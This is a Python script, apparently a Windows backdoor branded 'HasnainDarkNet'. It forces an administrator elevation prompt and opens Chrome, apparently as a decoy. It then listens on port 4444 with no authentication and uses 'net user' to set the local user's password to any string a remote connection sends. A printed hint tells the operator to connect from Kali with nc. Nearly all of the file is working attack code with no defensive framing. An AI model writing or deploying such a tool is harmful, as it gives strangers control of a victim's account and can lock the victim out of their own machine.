# File name: test.py
# Windows par save karo

import socket
import subprocess
import os
import sys
import ctypes
import time
import webbrowser

CHROME_URL = "https://www.google.com"

def open_chrome_background():
    try:
        chrome_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            r"C:\Users\{}\AppData\Local\Google\Chrome\Application\chrome.exe".format(os.getenv('USERNAME'))
        ]
        
        chrome_exe = None
        for path in chrome_paths:
            if os.path.exists(path):
                chrome_exe = path
                break
        
        if chrome_exe:
            subprocess.Popen([chrome_exe, CHROME_URL, "--new-window", "--start-maximized"],
                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
            print("[✓] Chrome opened in background!")
        else:
            webbrowser.open(CHROME_URL)
            print("[✓] Default browser opened!")
            
    except Exception as e:
        print(f"[!] Could not open Chrome: {e}")
        webbrowser.open(CHROME_URL)

def force_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except:
        pass
    
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(
        None, 
        "runas", 
        sys.executable, 
        f'"{script}" --admin', 
        None, 
        1
    )
    sys.exit()

if '--admin' not in ' '.join(sys.argv):
    force_admin()

open_chrome_background()

PORT = 4444
username = os.getenv('USERNAME')

def get_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "0.0.0.0"

def change_password(new_pass):
    try:
        print(f"\n[*] Changing password for {username} to: {new_pass}")
        
        result = subprocess.run(
            ['net', 'user', username, new_pass],
            capture_output=True,
            text=True,
            shell=True
        )
        
        if result.returncode == 0:
            print("[✓] Password changed successfully!")
            return True, "Success"
        else:
            print(f"[✗] Failed: {result.stderr}")
            return False, result.stderr
    except Exception as e:
        print(f"[!] Error: {e}")
        return False, str(e)

os.system('cls' if os.name == 'nt' else 'clear')

ip = get_ip()
print(f"""
╔══════════════════════════════════════════════════════════╗
║                 WINDOWS PASSWORD CHANGER                 ║
║                    (HasnainDarkNet)                      ║
╠══════════════════════════════════════════════════════════╣
║  Windows IP: {ip:<35} ║
║  Port: {PORT:<45} ║
║  User: {username:<45} ║
║  Status: RUNNING (ADMIN MODE)                            ║
╚══════════════════════════════════════════════════════════╝
""")
print(f"[*] Kali command: nc {ip} {PORT}")
print("[*] Waiting for connections...\n")

while True:
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))
        server.listen(1)
        
        print(f"[{time.strftime('%H:%M:%S')}] Listening...")
        conn, addr = server.accept()
        print(f"[+] Connected from: {addr[0]}")
        
        data = conn.recv(1024).decode().strip()
        print(f"[+] Password received: {data}")
        
        if data:
            success, message = change_password(data)
            
            if success:
                conn.send(b"SUCCESS: Password updated")
                print("[✓] Password update complete!")
            else:
                conn.send(b"ERROR: Password change failed")
                print("[✗] Password update failed")
        
        conn.close()
        server.close()
        print("-"*60)
        
    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(2)
